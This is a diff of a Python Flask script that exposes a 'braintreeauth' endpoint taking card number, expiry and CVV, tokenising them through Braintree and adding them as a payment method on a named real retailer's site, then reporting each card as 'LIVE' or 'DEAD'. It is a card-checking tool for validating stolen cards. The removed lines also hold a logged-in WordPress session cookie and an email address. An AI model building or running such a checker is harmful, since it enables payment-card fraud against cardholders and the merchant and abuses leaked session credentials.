@@ -1,92 +1,104 @@
-from flask import Flask, request, jsonify
+from flask import Flask, jsonify
 import requests
 import urllib.parse
 
 app = Flask(__name__)
 
-# === COOKIES (TERE DIYA HUA) ===
-cookies = {
-    'wordpress_sec_ed6aaaf2a4c77ec940184ceefa0c74db': 'xodado2963%7C1763385043%7Cg3GwWn5cnninjA05n4TaDvsWt3e3opoKRxXDG66b0Jo%7C9b96bcb55a9d84ef38f614124a2338a1549f35d7a8c6b6d27aeab7ee4a641cd2',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-11-03%2012%3A40%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-11-03%2012%3A40%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'mcforms-38097157-sessionId': '"468c1959-d4f2-4d37-a767-89343550f7c1"',
-    'woocommerce_current_currency': 'GBP',
-    '_ga': 'GA1.1.1965671026.1762175403',
-    'nitroCachedPage': '0',
-    '_fbp': 'fb.1.1762175413034.68996333666249601',
-    'mailchimp.cart.current_email': 'xodado2963@limtu.com',
-    'mailchimp_user_email': 'xodado2963%40limtu.com',
-    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'xodado2963%7C1763385043%7Cg3GwWn5cnninjA05n4TaDvsWt3e3opoKRxXDG66b0Jo%7Ca5982df901567bbc386ee9ab123e8834b0d6d94191f58ab3117ac12ddf262ec0',
-    '_gcl_au': '1.1.859187404.1762175404.1113773203.1762175440.1762175560',
-    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
-    '_ga_81KZY32HGV': 'GS2.1.s1762178226$o2$g1$t1762178392$j54$l0$h2001057033',
-    '_ga_0YYGQ7K779': 'GS2.1.s1762178226$o2$g1$t1762178392$j54$l0$h820852459',
-    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method-custom',
-}
+# === SITE KA PUBLIC CLIENT TOKEN ENDPOINT (VIDEO MEIN DIKHA) ===
+CLIENT_TOKEN_URL = "https://www.tea-and-coffee.com/wp-json/wc-braintree/v1/client-token"
 
-headers = {
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'x-requested-with': 'XMLHttpRequest',
-    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom',
-    'origin': 'https://www.tea-and-coffee.com',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-}
+# === ADMIN AJAX URL (TERE DIYA HUA) ===
+ADD_PAYMENT_URL = "https://www.tea-and-coffee.com/wp-admin/admin-ajax.php"
 
-def braintree_check(cc_num, mm, yy, cvv):
+# === NONCE FOR _wpnonce (TERE REQUEST SE) ===
+_WPNONCE = "9deae5d2bc"
+
+def get_client_token():
     try:
-        # Client Token
-        resp1 = requests.post(
-            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
-            cookies=cookies, headers=headers,
-            data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': '9deae5d2bc'},
-            timeout=15
-        )
-        if not resp1.json().get("success"):
-            return False
-        client_token = resp1.json()["data"]
+        resp = requests.get(CLIENT_TOKEN_URL, timeout=10)
+        if resp.status_code == 200:
+            return resp.json().get("data")
+    except:
+        return None
 
-        # Nonce (SANDBOX — REAL CARDS KE LIYE LIVE MEIN CHANGE KARNA)
-        bt_url = "https://api.sandbox.braintreegateway.com/merchants/the-kent-sussex-tea-and-coffee-company/payment_methods/credit_cards"
-        resp2 = requests.post(
-            bt_url,
-            json={"creditCard": {"number": cc_num, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}},
-            headers={"Authorization": f"Bearer {client_token}", "Content-Type": "application/json"},
-            timeout=15
-        )
-        if resp2.status_code != 201:
-            return False
-        nonce = resp2.json()["paymentMethod"]["nonce"]
+def create_nonce(cc, mm, yy, cvv, client_token):
+    try:
+        url = "https://payments.braintree-api.com/graphql"
+        headers = {
+            "Braintree-Version": "2019-01-01",
+            "Content-Type": "application/json"
+        }
+        payload = {
+            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "fake-session"},
+            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCards(input: $input) { paymentMethod { id } } }",
+            "variables": {
+                "input": {
+                    "creditCard": {
+                        "number": cc,
+                        "expirationMonth": mm,
+                        "expirationYear": yy,
+                        "cvv": cvv
+                    },
+                    "clientToken": client_token
+                }
+            },
+            "operationName": "TokenizeCreditCard"
+        }
+        resp = requests.post(url, json=payload, headers=headers, timeout=15)
+        data = resp.json()
+        if "data" in data and data["data"]["tokenizeCreditCards"]:
+            return data["data"]["tokenizeCreditCards"]["paymentMethod"][0]["id"]
+    except:
+        pass
+    return None
 
-        # Final Add
-        resp3 = requests.post(
-            'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
-            cookies=cookies, headers=headers,
-            data={'action': 'wc_braintree_add_payment_method', 'payment_method_nonce': nonce, '_wpnonce': '9deae5d2bc'},
-            timeout=15
-        )
-        return resp3.json().get("success", False)
-    
+def add_payment_method(nonce):
+    try:
+        data = {
+            'action': 'wc_braintree_add_payment_method',
+            'payment_method_nonce': nonce,
+            '_wpnonce': _WPNONCE
+        }
+        headers = {
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': 'https://www.tea-and-coffee.com',
+            'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom'
+        }
+        resp = requests.post(ADD_PAYMENT_URL, data=data, headers=headers, timeout=15)
+        result = resp.json()
+        return result.get("success", False)
     except:
         return False
 
 @app.route('/gate=braintreeauth/cc=<path:cc>', methods=['GET'])
 def check_braintree(cc):
     try:
+        # Fix URL encoding
         cc = urllib.parse.unquote(cc)
         parts = cc.split('|')
         if len(parts) != 4:
-            return jsonify({"success": False, "data": {"error": {"message": "Invalid format"}}}), 400
+            return jsonify({"success": False, "data": {"error": {"message": "Invalid: cc|mm|yy|cvc"}}}), 400
         
         cc_num, mm, yy, cvv = [p.strip() for p in parts]
-        if braintree_check(cc_num, mm, yy, cvv):
+        
+        # Step 1: Get Client Token
+        client_token = get_client_token()
+        if not client_token:
+            return jsonify({"success": False, "data": {"error": {"message": "Token Error"}}}), 500
+        
+        # Step 2: Create Nonce
+        nonce = create_nonce(cc_num, mm, yy, cvv, client_token)
+        if not nonce:
+            return jsonify({"success": False, "data": {"error": {"message": "DEAD - Invalid Card"}}})
+        
+        # Step 3: Add Payment Method
+        if add_payment_method(nonce):
             return jsonify({"success": True, "data": {"message": "LIVE - Card added!"}})
         else:
             return jsonify({"success": False, "data": {"error": {"message": "DEAD - Card declined!"}}})
     
-    except:
+    except Exception as e:
         return jsonify({"success": False, "data": {"error": {"message": "Server Error"}}}), 500
 
 if __name__ == '__main__':
